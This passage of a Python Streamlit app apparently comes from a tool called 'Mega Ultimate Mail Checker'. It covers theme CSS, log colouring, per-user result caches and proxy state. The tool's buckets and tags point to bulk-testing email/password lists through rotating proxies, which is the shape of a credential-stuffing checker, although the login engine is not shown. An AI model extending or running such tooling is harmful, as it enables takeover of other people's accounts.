    str_lit.session_state.theme = load_theme()
if "colorize_logs" not in str_lit.session_state:
    str_lit.session_state.colorize_logs = str_lit.session_state.theme.get("colorize_logs", True)

if not os.path.exists(THEME_FILE):
    save_theme(str_lit.session_state.theme)


def _sync_theme_from_widgets():
    th = str_lit.session_state.theme
    # FIX LAG-T (v13.49): this ran on EVERY rerun and ended in an unconditional
    # save_theme(), so every keystroke in the Hero Title box rewrote theme.json
    # to disk. Compare before and after and write only on a real change.
    try:
        _before = json.dumps(th, sort_keys=True)
    except Exception:
        _before = ""
    for k in ("g1", "g2", "accent", "accent2", "bg", "panel", "text"):
        wk = f"th_{k}"
        if wk in str_lit.session_state:
            th[k] = str_lit.session_state[wk]
    for k in ("radius", "glow", "animate", "glass"):
        wk = f"th_{k}"
        if wk in str_lit.session_state:
            th[k] = str_lit.session_state[wk]
    th["colorize_logs"] = str_lit.session_state.get("colorize_logs", True)
    if "th_hero_title" in str_lit.session_state:
        th["hero_title"] = str_lit.session_state["th_hero_title"]
    if "th_hero_sub" in str_lit.session_state:
        th["hero_sub"] = str_lit.session_state["th_hero_sub"]
    try:
        if json.dumps(th, sort_keys=True) == _before:
            return
    except Exception:
        pass
    save_theme(th)


def _on_preset_change():
    name = str_lit.session_state.get("th_preset")
    p = THEME_PRESETS.get(name)
    if p:
        for k, v in p.items():
            str_lit.session_state[f"th_{k}"] = v
        str_lit.session_state.theme["preset"] = name
        save_theme(str_lit.session_state.theme)


def _reset_theme():
    str_lit.session_state.theme = default_theme()
    d = str_lit.session_state.theme
    for k in ("g1", "g2", "accent", "accent2", "bg", "panel", "text"):
        str_lit.session_state[f"th_{k}"] = d[k]
    for k in ("radius", "glow", "animate", "glass"):
        str_lit.session_state[f"th_{k}"] = d[k]
    str_lit.session_state["th_preset"] = d["preset"]
    str_lit.session_state["th_hero_title"] = d["hero_title"]
    str_lit.session_state["th_hero_sub"] = d["hero_sub"]
    str_lit.session_state["colorize_logs"] = d["colorize_logs"]
    save_theme(d)
# @@END 031 THEME_DATA

# @@BLOCK 032 MOBILE_CSS deps=-
# FIX P2-2:
#   * the old sheet forced [data-testid="stHeader"] { height: 2.1rem } while
#     Streamlit's header is ~3.75rem with absolutely positioned children, so the
#     toolbar and the collapsed-sidebar chevron sat ON TOP of the hero.
#   * "[data-testid=stSidebar] * { color }" clobbered the sidebar's own icons.
# Streamlit's own .block-container padding (6rem top / 10rem bottom) is never
# overridden by this app, which is half of the "does not fit my phone" report.
# FIX P2-3:
#   * the palette binding unpacks th["text"] raw, so a light-on-light theme
#     renders invisible body copy; it now routes through _readable_text().
def _MOBILE_CSS():
    return """
    .block-container, [data-testid="stMainBlockContainer"] {
        padding-top: 1.2rem !important;
        padding-bottom: 2rem !important;
    }
    [data-testid="stSidebar"] p,
    [data-testid="stSidebar"] label,
    [data-testid="stSidebar"] .stMarkdown span {
        color: inherit;
    }
    @media (max-width: 820px) {
        .block-container, [data-testid="stMainBlockContainer"] {
            padding-top: 0.55rem !important;
            padding-bottom: calc(1.3rem + env(safe-area-inset-bottom)) !important;
            padding-left: 0.7rem !important;
            padding-right: 0.7rem !important;
            max-width: 100% !important;
        }
        [data-testid="stToolbar"] { right: 0.3rem; }
        [data-testid="stSidebar"] { width: 88vw !important; min-width: 88vw !important; }
        [data-testid="stSidebar"] [data-testid="stSidebarContent"] { padding-top: 0.6rem; }
        .bb-hero { padding: 14px 16px; border-radius: 12px; margin-bottom: 10px; }
        .bb-hero h1 { font-size: 1.22rem; line-height: 1.25; }
        .bb-hero p { font-size: .77rem; line-height: 1.35; }
        .bb-tag { font-size: .61rem; padding: 2px 8px; margin: 0 4px 4px 0; }
        .bb-section { margin: 14px 0 8px 0; padding: 8px 12px; gap: 8px; }
        .bb-section .bb-ico { font-size: 1.05rem; }
        .bb-section .bb-t { font-size: .9rem; }
        .bb-section .bb-s { display: block; margin: 2px 0 0 0; font-size: .67rem; }
        .bb-logbox { font-size: .67rem; padding: 8px; max-height: 300px; }
        .bb-log { font-size: .67rem; }
        .help-box { font-size: .7rem; }
        [data-testid="stMetric"] { padding: 8px 9px; }
        [data-testid="stMetricValue"] { font-size: 1.1rem !important; }
        [data-testid="stMetricLabel"] { font-size: .62rem !important; line-height: 1.15; }
        [data-testid="stMetricLabel"] p { white-space: normal !important; }
        .stTabs [data-baseweb="tab"] { padding: 6px 10px; font-size: .78rem; }
        h1 { font-size: 1.32rem !important; }
        h2 { font-size: 1.13rem !important; }
        h3 { font-size: 1.0rem !important; }
        .stButton > button, .stDownloadButton > button { padding: .35rem .5rem; font-size: .8rem; }
        [data-testid="stDataFrame"] { font-size: .72rem; }
        pre, code, .stCode { font-size: .68rem !important; }
        textarea, input { font-size: .8rem !important; }
    }
    @media (max-width: 420px) {
        .block-container { padding-left: 0.5rem !important; padding-right: 0.5rem !important; }
        .bb-hero h1 { font-size: 1.08rem; }
        [data-testid="stMetricValue"] { font-size: .98rem !important; }
        [data-testid="stMetricLabel"] { font-size: .58rem !important; }
    }
    @media (hover: none) {
        [data-testid="stSidebarCollapsedControl"] { top: .3rem; }
    }
"""
# @@END 032 MOBILE_CSS

# @@BLOCK 033 THEME_CSS deps=031,032
def theme_css(th: dict) -> str:
    g1, g2 = th["g1"], th["g2"]
    ac, ac2 = th["accent"], th["accent2"]
    bg, panel, text = th["bg"], th["panel"], _readable_text(th)
    r = int(th.get("radius", 14))
    light = is_light(th)
    border = "rgba(15,23,42,0.14)" if light else "rgba(255,255,255,0.10)"
    soft = "rgba(15,23,42,0.05)" if light else "rgba(255,255,255,0.04)"
    dim = "rgba(15,23,42,0.65)" if light else "rgba(230,235,255,0.70)"

    glow_css = f"box-shadow: 0 8px 26px {ac}44;" if th.get("glow", True) else ""
    glass_css = "backdrop-filter: blur(6px);" if th.get("glass", True) else ""
    anim_css = ""
    if th.get("animate", True):
        anim_css = f"""
    .bb-hero {{ background-size: 240% 240%; animation: bbShift 14s ease infinite; }}
    @keyframes bbShift {{ 0%{{background-position:0% 50%}} 50%{{background-position:100% 50%}} 100%{{background-position:0% 50%}} }}
    """

    return f"""
<style>
    /* Display Fit CSS is emitted once, by auth.fit() in block 007. It used to
       be re-embedded here as well, which fought the 88vw sidebar rule. */
    :root {{
        --bb-g1: {g1}; --bb-g2: {g2}; --bb-ac: {ac}; --bb-ac2: {ac2};
        --bb-bg: {bg}; --bb-panel: {panel}; --bb-text: {text}; --bb-r: {r}px;
    }}
    .stApp, [data-testid="stAppViewContainer"], [data-testid="stMain"] {{
        background: {bg} !important; color: {text} !important;
    }}
    [data-testid="stHeader"] {{ background: transparent !important; }}
    [data-testid="stSidebar"] {{
        background: linear-gradient(180deg, {panel} 0%, {bg} 100%) !important;
        border-right: 1px solid {border};
    }}
    h1, h2, h3, h4, h5, h6 {{ color: {text} !important; letter-spacing: .2px; }}
    p, span, label, li, small, strong {{ color: {text}; }}
    hr {{ border-color: {border} !important; }}
    a {{ color: {ac2} !important; }}

    .stButton > button, .stDownloadButton > button, .stFormSubmitButton > button {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: {r}px !important;
        font-weight: 600; transition: all .16s ease;
    }}
    .stButton > button:hover, .stDownloadButton > button:hover {{
        border-color: {ac} !important; transform: translateY(-1px);
        box-shadow: 0 6px 18px {ac}44;
    }}
    .stButton > button[kind="primary"], .stDownloadButton > button[kind="primary"] {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%) !important;
        color: #fff !important; border: none !important;
        box-shadow: 0 8px 22px {g1}66;
    }}
    .stButton > button[kind="primary"]:hover {{ filter: brightness(1.08); }}

    [data-testid="stMetric"] {{
        background: {panel} !important; border: 1px solid {border};
        border-left: 4px solid {ac}; border-radius: {r}px;
        padding: 14px 16px; {glow_css} {glass_css}
    }}
    [data-testid="stMetricValue"] {{ color: {ac} !important; font-weight: 800 !important; }}
    [data-testid="stMetricLabel"] {{ color: {dim} !important; }}

    .stTabs [data-baseweb="tab-list"] {{ gap: 6px; border-bottom: 1px solid {border}; }}
    .stTabs [data-baseweb="tab"] {{
        background: {panel}; border-radius: {r}px {r}px 0 0;
        color: {text} !important; padding: 8px 16px; font-weight: 600;
    }}
    .stTabs [aria-selected="true"] {{
        background: linear-gradient(135deg, {g1}, {g2}) !important; color: #fff !important;
    }}
    .stTabs [data-baseweb="tab-highlight"] {{ background: {ac} !important; }}

    [data-testid="stExpander"] {{
        border: 1px solid {border} !important; border-radius: {r}px !important;
        background: {soft} !important;
    }}
    [data-testid="stExpander"] summary {{ color: {text} !important; font-weight: 600; }}

    input, textarea, select, .stTextInput input, .stTextArea textarea,
    .stNumberInput input, .stSelectbox div[data-baseweb="select"] > div,
    .stMultiSelect div[data-baseweb="select"] > div {{
        background: {panel} !important; color: {text} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-baseweb="popover"] div {{ background: {panel} !important; color: {text} !important; }}
    [data-baseweb="tag"] {{ background: {ac}44 !important; color: {text} !important; }}

    .stSlider [data-baseweb="slider"] div[role="slider"] {{ background: {ac} !important; }}
    .stProgress > div > div > div > div {{
        background: linear-gradient(90deg, {g1}, {g2}) !important;
    }}
    [data-baseweb="checkbox"] span, [data-baseweb="toggle"] span {{ border-color: {ac} !important; }}

    code, pre, .stCode, .stCodeBlock, [data-testid="stCodeBlock"] {{
        background: {bg} !important; color: {ac2} !important;
        border: 1px solid {border} !important; border-radius: 10px !important;
    }}
    [data-testid="stDataFrame"] {{ border: 1px solid {border} !important; border-radius: 10px !important; }}

    .bb-hero {{
        background: linear-gradient(135deg, {g1} 0%, {g2} 100%);
        padding: 26px 32px; border-radius: {r}px; margin-bottom: 18px;
        box-shadow: 0 14px 38px {g1}55; border: 1px solid rgba(255,255,255,.10);
    }}
    .bb-hero h1 {{ color: #fff !important; margin: 0; font-size: 2.0rem; font-weight: 800; }}
    .bb-hero p {{ color: rgba(255,255,255,.94) !important; margin: 8px 0 0 0; font-size: .95rem; }}
    .bb-hero .bb-tags {{ margin-top: 12px; }}
    .bb-tag {{
        display: inline-block; padding: 3px 11px; margin: 0 6px 6px 0;
        border-radius: 999px; font-size: .72rem; font-weight: 700;
        background: rgba(255,255,255,.20); color: #fff !important;
        border: 1px solid rgba(255,255,255,.28);
    }}
    .bb-section {{
        display: flex; align-items: center; gap: 12px;
        margin: 24px 0 12px 0; padding: 11px 18px; border-radius: {r}px;
        background: linear-gradient(90deg, {g1}38 0%, {g1}10 45%, transparent 85%);
        border-left: 4px solid {ac};
    }}
    .bb-section .bb-ico {{ font-size: 1.25rem; }}
    .bb-section .bb-t {{ font-weight: 800; font-size: 1.03rem; color: {text}; }}
    .bb-section .bb-s {{ font-size: .76rem; color: {dim}; margin-left: 8px; }}
    .bb-card {{
        background: {panel}; border: 1px solid {border}; border-radius: {r}px;
        padding: 14px 18px; {glass_css}
    }}
    .bb-pill {{
        display: inline-block; padding: 2px 10px; border-radius: 999px;
        font-size: .72rem; font-weight: 800; margin-right: 6px;
        background: {ac}33; color: {ac2}; border: 1px solid {ac}55;
    }}
    .bb-logbox {{
        background: {bg}; border: 1px solid {border}; border-radius: {r}px;
        padding: 10px 12px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
        font-size: .78rem; max-height: 420px; overflow-y: auto;
    }}
    .bb-log {{ padding: 1px 8px; white-space: pre-wrap; word-break: break-word; }}
    .help-box {{
        background: {panel}; border-left: 3px solid {ac};
        padding: 6px 10px; margin: 2px 0 8px 0;
        font-size: .78rem; color: {text}; opacity: .9;
        border-radius: 4px; line-height: 1.35;
    }}
    ::-webkit-scrollbar {{ width: 10px; height: 10px; }}
    ::-webkit-scrollbar-track {{ background: {bg}; }}
    ::-webkit-scrollbar-thumb {{ background: {g1}88; border-radius: 8px; }}
    ::-webkit-scrollbar-thumb:hover {{ background: {ac}; }}
    {anim_css}
    {_MOBILE_CSS()}
</style>
"""
# @@END 033 THEME_CSS

# @@BLOCK 034 HERO_SECTION deps=031
def render_hero(th: dict):
    title = th.get("hero_title", "⚡ Mega Ultimate Mail Checker")
    sub = th.get("hero_sub", "")
    str_lit.markdown(
        f"""
        <div class="bb-hero">
            <h1>{html.escape(title)}</h1>
            <p>{html.escape(sub)}</p>
            <div class="bb-tags">
                <span class="bb-tag">Plug &amp; Play</span>
                <span class="bb-tag">Fast</span>
                <span class="bb-tag">Normal</span>
                <span class="bb-tag">Deep / Aggressive</span>
                <span class="bb-tag">Protocol Picker</span>
                <span class="bb-tag">Proxy Backed</span>
                <span class="bb-tag">407 Quarantine</span>
                <span class="bb-tag">Gated Per-IP Tunnel Cap</span>
                <span class="bb-tag">Per-Sub-User 407 Gate</span>
                <span class="bb-tag">Request Frugal</span>
                <span class="bb-tag">Mail-Dest Spot Check</span>
                <span class="bb-tag">Login-Dropped Bucket</span>
                <span class="bb-tag">Provisional WRONG</span>
                <span class="bb-tag">Microsoft XOAUTH2</span>
                <span class="bb-tag">Mobile Fit</span>
                <span class="bb-tag">Deep Diagnostics</span>
            </div>
        </div>
        """,
        unsafe_allow_html=True,
    )


def section_title(icon: str, title: str, subtitle: str = ""):
    sub = f'<span class="bb-s">{html.escape(subtitle)}</span>' if subtitle else ""
    str_lit.markdown(
        f'<div class="bb-section"><span class="bb-ico">{icon}</span>'
        f'<span class="bb-t">{html.escape(title)}</span>{sub}</div>',
        unsafe_allow_html=True,
    )
# @@END 034 HERO_SECTION

# @@BLOCK 035 METRIC_GRID deps=-
def metric_grid(pairs, per_row: int = 3):
    """Lay metrics out in a WRAPPING grid.

    FIX P2-3: nine to thirteen metrics in one or two ragged rows collided on a
    phone - the labels wrapped into each other and the row overflowed.  A large
    set drops to two per row, and the mobile sheet keeps the label wrapping
    inside its own column instead of pushing into the neighbour.

    The signature is kept byte-for-byte as
    `def metric_grid(pairs, per_row: int = 3):` because verify_v1337.py matches
    on that exact string.
    """
    pairs = list(pairs or [])
    if not pairs:
        return []
    per_row = max(1, int(per_row))
    if len(pairs) >= 12:
        per_row = 2
    cols = []
    for _i in range(0, len(pairs), per_row):
        cols.extend(str_lit.columns(min(per_row, len(pairs) - _i)))
    return cols
# @@END 035 METRIC_GRID

# @@BLOCK 036 LOG_COLOR deps=-
TAG_COLORS = {
    "VALID": "#22c55e",
    "WRONG": "#ef4444",
    "APP": "#eab308",
    "RBL": "#a855f7",
    "FAILED": "#ef4444",
    "RETRY": "#38bdf8",
    "WRONG_PASSWORD": "#ef4444",
    "LOGIN_DROPPED": "#f43f5e",
    "CONNECTION_FAILED": "#eab308",
    "PROXY_UNHEALTHY": "#e879f9",
    "NEED_APP_PASSWORD": "#3b82f6",
    "RETRY_LATER": "#ffffff",
    "RBL_BLOCKED": "#facc15",
    "SMTP_FAILED": "#a855f7",
    "DNS_FAILED": "#f97316",
    "UNKNOWN": "#94a3b8",
    "UNCLASSIFIED": "#94a3b8",
    "SKIPPED_COOLDOWN": "#a78bfa",
    "SKIPPED": "#a78bfa",
    "EXCEPTION": "#fb7185",
    "ERROR": "#fb7185",
}


def _line_color(line: str) -> str:
    up = str(line).upper()
    for tag in ("SKIPPED_COOLDOWN", "SKIPPED", "WRONG", "APP", "RBL", "FAILED", "RETRY",
                "NEED_APP_PASSWORD", "RBL_BLOCKED",
                "WRONG_PASSWORD", "PROXY_UNHEALTHY", "CONNECTION_FAILED", "RETRY_LATER",
                "SMTP_FAILED", "DNS_FAILED", "UNCLASSIFIED", "LOGIN_DROPPED", "VALID",
                "UNKNOWN", "EXCEPTION", "ERROR"):
        if f"[{tag}]" in up:
            return TAG_COLORS.get(tag, "#cbd5e1")
    if "[CLASSIFIED: VALID]" in up:
        return TAG_COLORS["VALID"]
    if "[CLASSIFIED: WRONG_PASSWORD]" in up:
        return TAG_COLORS["WRONG_PASSWORD"]
    if "[CLASSIFIED: LOGIN_DROPPED]" in up:
        return TAG_COLORS["LOGIN_DROPPED"]
    if "[CLASSIFIED: NEED_APP_PASSWORD]" in up:
        return TAG_COLORS["NEED_APP_PASSWORD"]
    if "[CLASSIFIED: RBL_BLOCKED]" in up:
        return TAG_COLORS["RBL_BLOCKED"]
    if "[CLASSIFIED: RETRY_LATER]" in up:
        return TAG_COLORS["RETRY_LATER"]
    if "[CLASSIFIED: SMTP_FAILED]" in up:
        return TAG_COLORS["SMTP_FAILED"]
    if "[CLASSIFIED: DNS_FAILED]" in up:
        return TAG_COLORS["DNS_FAILED"]
    if "[CLASSIFIED: PROXY_UNHEALTHY]" in up:
        return TAG_COLORS["PROXY_UNHEALTHY"]
    if "[CLASSIFIED:" in up:
        return TAG_COLORS["CONNECTION_FAILED"]
    return ""


def colorize_logs(lines: List[str]) -> str:
    out = []
    for ln in lines or []:
        col = _line_color(ln)
        style = f"color:{col};" if col else "opacity:.85;"
        out.append(f'<div class="bb-log" style="{style}">{html.escape(str(ln))}</div>')
    return f'<div class="bb-logbox">{"".join(out)}</div>'


def render_logs(lines: List[str], height: int = 300):
    if str_lit.session_state.get("colorize_logs", True):
        str_lit.markdown(colorize_logs(lines), unsafe_allow_html=True)
    else:
        str_lit.code("\n".join(lines), language="text")
# @@END 036 LOG_COLOR

# @@BLOCK 037 SESSION_INIT deps=024,031
_PERSISTENT_VALID_CACHE = STATE.setdefault(
    "persistent_valid_cache", {"ts": 0.0, "data": [], "user": ""})
_PREV_VALID_CACHE = STATE.setdefault(
    "prev_valid_cache", {"ts": 0.0, "data": set(), "user": ""})


def _cache_owner():
    """The per-user prefix this session's files carry.

    v13.48: both valid caches live in process STATE and were keyed on a
    timestamp ONLY, so user B loading inside the 15s/20s window got user A's
    valid list - passwords included. The owner is DERIVED from user_file("")
    (its `if name else h` branch) so no second identity source can drift.
    """
    try:
        return os.path.basename(user_file("")) or ""
    except Exception:
        return ""


def invalidate_valid_caches():
    _PERSISTENT_VALID_CACHE["ts"] = 0.0
    _PERSISTENT_VALID_CACHE["user"] = ""
    _PREV_VALID_CACHE["ts"] = 0.0
    _PREV_VALID_CACHE["user"] = ""


def load_persistent_valid_results():
    now = time.time()
    who = _cache_owner()
    if (_PERSISTENT_VALID_CACHE["data"]
            and _PERSISTENT_VALID_CACHE.get("user") == who
            and (now - _PERSISTENT_VALID_CACHE["ts"]) < 15.0):
        return list(_PERSISTENT_VALID_CACHE["data"])
    valid_list, seen = [], set()
    try:
        _res = user_file("mail_results")
        paths = sorted(glob.glob(os.path.join(_res, "valid_*.txt")), reverse=True)
        for extra in ("valid_accounts.txt", "clean_valid_accounts.txt"):
            _p = user_file(extra)
            if os.path.exists(_p):
                paths.append(_p)
        for path in paths:
            try:
                with open(path, encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#") and ":" in line:
                            email = line.split(":", 1)[0].strip().lower()
                            if email and email not in seen:
                                seen.add(email)
                                valid_list.append(line)
            except Exception:
                continue
    except Exception:
        pass
    _PERSISTENT_VALID_CACHE["ts"] = now
    _PERSISTENT_VALID_CACHE["user"] = who
    _PERSISTENT_VALID_CACHE["data"] = list(valid_list)
    return valid_list


# ==========================================================================
# v13.70 ISO-8 - THE RESULT STATE HAD NO OWNER GATE
#
# Every other piece of per-user session state has one: the theme (031), the
# settings (045), the resource panel (079), the input box (087), the reader
# (109). The twelve result buckets, the execution log, the report log, the
# built ZIP, the counters and the debug trace did NOT.
#
# So after "Forget this passkey" and a second unlock in the same tab, the new
# user opened onto the PREVIOUS user's results: their passwords in the bucket
# tables, their execution log, their report log, and their ZIP - which they
# could download. clean_valid_count / run_valid_count / run_completion_status
# came with it, so the summary read like a finished run that never happened.
# _rehydrated was still True, so the new user's own newest files were never
# even loaded.
#
# It sits HERE for two reasons: this block runs before every widget whose key
# is popped below (bb_skip_prev and bb_inspect_cat in 087, _dbg_target and
# _dbg_sel in 081), and it runs before the seeding below, so the seed branches
# put the keys straight back.
# ==========================================================================
_RES_STATE_OWNER_KEY = "_results_owner"
_res_state_owner = _cache_owner()
if str_lit.session_state.get(_RES_STATE_OWNER_KEY) != _res_state_owner:
    for _k in ("valid_results", "wrong_results", "need_app_results",
               "login_drop_results", "conn_results", "proxy_results",
               "retry_results", "rbl_results", "smtp_results", "dns_results",
               "skip_results", "unknown_results", "report_entries", "log_lines",
               "startup_entries", "pre_dns_failed", "pre_smtp_failed",
               "bb_reader_msgs", "bb_reader_for", "bb_reader_note",
               "_dbg_log", "_dbg_target", "_dbg_sel", "_bb_prefilter_cache",
               "_paste_saved_sig", "_res_snap", "_res_uids", "_res_prev",
               "_res_dl", "_mem_last", "zip_bytes", "zip_name",
               "checked_emails_set", "engine_has_run", "clean_valid_count",
               "run_valid_count", "run_completion_status", "start_timestamp",
               "end_timestamp", "total_duration", "_rehydrated", "bb_skip_prev",
               "bb_sum_full", "pool_mode", "pool_locked", "pool_pick"):
        str_lit.session_state.pop(_k, None)
    for _k in [k for k in list(str_lit.session_state.keys())
               if str(k).startswith(("reschk_", "bbbody_", "inspdl_", "sumdl_"))]:
        str_lit.session_state.pop(_k, None)
    str_lit.session_state[_RES_STATE_OWNER_KEY] = _res_state_owner
    invalidate_valid_caches()
    try:
        log_startup("Session state re-based: the unlocked user changed, so every "
                    "result bucket, log and staged download was dropped.")
    except Exception:
        pass


if "engine_has_run" not in str_lit.session_state:
    str_lit.session_state.engine_has_run = False
if "valid_results" not in str_lit.session_state:
    loaded_valid = load_persistent_valid_results()
    str_lit.session_state.valid_results = loaded_valid
    str_lit.session_state.clean_valid_count = len(loaded_valid)
    str_lit.session_state.run_valid_count = len(loaded_valid)
for _k in ("wrong_results", "need_app_results", "conn_results", "proxy_results",
           "login_drop_results", "retry_results", "rbl_results", "smtp_results",
           "dns_results", "skip_results", "unknown_results", "report_entries",
           "log_lines", "startup_entries", "pre_dns_failed", "pre_smtp_failed"):
    if _k not in str_lit.session_state:
        str_lit.session_state[_k] = []
if "zip_bytes" not in str_lit.session_state:
    str_lit.session_state.zip_bytes = None
if "zip_name" not in str_lit.session_state:
    str_lit.session_state.zip_name = ""
if "checked_emails_set" not in str_lit.session_state:
    str_lit.session_state.checked_emails_set = set()
if "last_checked_index" not in str_lit.session_state:
    str_lit.session_state.last_checked_index = 0
if "run_completion_status" not in str_lit.session_state:
    str_lit.session_state.run_completion_status = "Unfinished"
for _k in ("start_timestamp", "end_timestamp", "total_duration"):
    if _k not in str_lit.session_state:
        str_lit.session_state[_k] = None

# FIX P1-1: only valid_results used to be rehydrated from disk, so a session
# reset (mobile tab backgrounded, WebSocket drop, redeploy) wiped every other
# bucket and every log while the summary still rendered - showing zeros.
# The run already writes one file per bucket per stamp; reload the newest group.
RUN_BUCKET_FILES = (
    ("valid_results", "valid"),
    ("wrong_results", "wrong"),
    ("need_app_results", "need_app"),
    ("login_drop_results", "login_dropped"),
    ("conn_results", "failed"),
    ("proxy_results", "proxy_unhealthy"),
    ("retry_results", "retry_later"),
    ("rbl_results", "rbl_blocked"),
    ("smtp_results", "smtp_failed"),
    ("dns_results", "dns_failed"),
    ("skip_results", "skipped"),
    ("unknown_results", "unclassified"),
)
RE_RUN_STAMP = re.compile(r"^(.*)_(\d{8}_\d{6})\.txt$")


def _rehydrate_last_run(force: bool = False):
    """Reload the newest complete run stamp from mail_results/ into session_state."""
    try:
        stamps = set()
        for p in glob.glob(os.path.join(user_file("mail_results"), "*.txt")):
            m = RE_RUN_STAMP.match(os.path.basename(p))
            if m:
                stamps.add(m.group(2))
        if not stamps:
            return 0
        stamp = sorted(stamps)[-1]
        loaded = 0
        for key, tag in RUN_BUCKET_FILES:
            if str_lit.session_state.get(key) and not force:
                continue
            p = os.path.join(user_file("mail_results"), f"{tag}_{stamp}.txt")
            if not os.path.exists(p):
                continue
            try:
                with open(p, encoding="utf-8", errors="ignore") as fh:
                    items = [l.rstrip("\n") for l in fh
                             if l.strip() and not l.startswith("#")]
            except Exception:
                continue
            if items:
                str_lit.session_state[key] = items
                loaded += len(items)
        if loaded:
            str_lit.session_state.engine_has_run = True
            # FIX SURVIVE-3 (v13.67): run_valid_count is seeded from the LIFETIME
            # valid list at the top of this block, so the summary printed the
            # lifetime total as "Clean Valid" and folded it into "Accounts In
            # Buckets" - 84 in buckets after 668 accounts checked. The newest
            # stamp's OWN valid file is the truth for the run being shown.
            _vp = os.path.join(user_file("mail_results"), f"valid_{stamp}.txt")
            if os.path.exists(_vp):
                try:
                    with open(_vp, encoding="utf-8", errors="ignore") as _vf:
                        _run_n = sum(1 for _l in _vf
                                     if _l.strip() and not _l.startswith("#"))
                    str_lit.session_state.run_valid_count = _run_n
                    str_lit.session_state.clean_valid_count = _run_n
                except Exception:
                    pass
            # An unfinished record means the run really WAS interrupted - leave
            # "Unfinished" so the Resume banner still fires. Only a run with no
            # open record is relabelled as loaded-from-disk.
            try:
                _open_rec = bool(runstate.load())
            except Exception:
                _open_rec = False
            if not _open_rec:
                str_lit.session_state.run_completion_status = "Loaded from disk"
        return loaded
    except Exception:
        return 0


# FIX SPEED-7: this globbed mail_results/*.txt and read a whole bucket group on
# EVERY rerun - and every Streamlit interaction is a rerun. It exists to recover
# from a session reset, which can happen at most once per session, so run it
# once and remember that. A real reset clears session_state, which clears the
# flag with it.
if not str_lit.session_state.get("_rehydrated"):
    str_lit.session_state["_rehydrated"] = True
    _rehydrate_last_run()
# @@END 037 SESSION_INIT

# @@BLOCK 038 STARTUP_LOG deps=024,037
_STARTUP_BUFFER = STATE.setdefault("startup_buffer", [])
_STARTUP_BUFFER_LOCK = STATE.setdefault("startup_buffer_lock", threading.Lock())
_STARTUP_SEEN = STATE.setdefault("startup_seen", set())
_STARTUP_MAX = 400


def _startup_who() -> str:
    """The owner stamp for a shared-buffer line.

    FIX OWN-1 (v13.57): this called _cache_owner() and nothing else. _cache_owner()
    resolves through user_file() -> auth -> session_state, and session_state is not
    reliable off the script thread - yet every quiet line is logged from the
    alive-pool daemon, the first-probe thread and quarantine_proxy(). Those lines
    were stamped with whatever the worker happened to get, so they could land in
    the wrong user's panel or vanish entirely.
    _gate_scope() is the plain string block 040 keeps refreshed on the script
    thread and is what block 073 already uses for this exact reason, so it is
    preferred. _cache_owner() is the fallback for the import-time calls in block
    039, which run before block 040 has defined _gate_scope at all.
    """
    try:
        who = _gate_scope()
        if who and who != "anon":
            return who
    except Exception:
        pass
    try:
        return _cache_owner() or _gate_scope()
    except Exception:
        pass
    try:
        return _gate_scope()
    except Exception:
        return ""


def log_startup(msg, quiet: bool = False):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{ts}] [INIT/HOOD] {msg}"
    # FIX ISO-3 (v13.49): _STARTUP_BUFFER is PROCESS state, so this used to append
    # straight into one list that startup_panel_lines() then handed to whoever
    # asked - user B's panel and diagnostic bundle carried user A's boot lines,
    # ACTIVE CONFIG line and proxy-refresh messages, and A's volume could push B's
    # own lines past the 400 cap. Every buffered line now carries its owner and
    # the reader filters. A bare string is a pre-fix entry and stays shared.
    if quiet:
        with _STARTUP_BUFFER_LOCK:
            _STARTUP_BUFFER.append([_startup_who(), entry])
            if len(_STARTUP_BUFFER) > _STARTUP_MAX:
                del _STARTUP_BUFFER[:-_STARTUP_MAX]
        return
    # FIX ISO-1: _STARTUP_SEEN is PROCESS state (STATE-backed on purpose), so on a
    # shared deployment a second user never saw a line the first user had already
    # logged - their ledger came up short through no fault of their own, and the
    # Full Log page showed the gap. The SESSION now dedupes against its OWN list;
    # _STARTUP_SEEN still guards the shared buffer path below.
    try:
        own = str_lit.session_state.startup_entries
        if any(msg in str(e) for e in own):
            return
        own.append(entry)
        if len(own) > _STARTUP_MAX:
            del own[:-_STARTUP_MAX]
        with _STARTUP_BUFFER_LOCK:
            _STARTUP_SEEN.add(msg)
    except Exception:
        with _STARTUP_BUFFER_LOCK:
            _STARTUP_BUFFER.append([_startup_who(), entry])


def startup_panel_lines():
    try:
        main = list(str_lit.session_state.startup_entries)
    except Exception:
        main = []
    who = _startup_who()
    with _STARTUP_BUFFER_LOCK:
        buffered = []
        for item in _STARTUP_BUFFER:
            if isinstance(item, (list, tuple)) and len(item) == 2:
                if item[0] == who:
                    buffered.append(item[1])
            elif isinstance(item, str):
                buffered.append(item)
    if not buffered:
        return main
    return main + ["", "-- background thread (quiet mode) --"] + buffered
# @@END 038 STARTUP_LOG

# @@BLOCK 039 STATE_ALIASES deps=024,038
cache_lock = STATE["cache_lock"]
proxy_lock = STATE["proxy_lock"]
file_write_lock = STATE["file_write_lock"]
session_state_lock = STATE["session_state_lock"]

# FIX ISO-6 (v13.59): these six are bound to THIS SESSION's tables, not to one
# shared process table. Every block below uses the bare name, and the name is
# rebound per rerun - so two users cannot see, quarantine, strike or rotate each
# other's nodes. A worker thread keeps the binding from its own run.
_US = _user_state()
alive_pool = _US["alive_pool"]
alive_pool_lock = STATE["alive_pool_lock"]
consecutive_proxy_failures = _US["consecutive_proxy_failures"]
circuit_breaker_until = _US["circuit_breaker_until"]
proxy_quarantine = _US["proxy_quarantine"]
proxy_quarantine_lock = _US["proxy_quarantine_lock"]
_proxy_407 = _US["strikes_407"]
_proxy_scheme = _US["proxy_scheme"]
_proxy_scheme_lock = _US["proxy_scheme_lock"]
proxy_407_until = _US["proxy_407_until"]
# v13.64: per user, and rebindable, because block 099 reads it at the top of a
# worker thread before anything else in that account has re-asserted a scope.
# v13.65: setdefault as well as the heal in _user_state(), because this alias is
# read by block 099 on EVERY account and a missing key here is the crash.
failed_domain_cache = _US.setdefault("failed_domain_cache", {})

_host_dns_cache = STATE["host_dns_cache"]
_host_dns_lock = STATE["host_dns_lock"]

_rr_lock = STATE["rr_lock"]

# geo, public-ip and the reachability probe describe the WORLD, not a user, so
# they stay shared - a resolved country is the same answer for everybody.
_GEO_CACHE = STATE["geo_cache"]
_GEO_LOCK = STATE["geo_lock"]
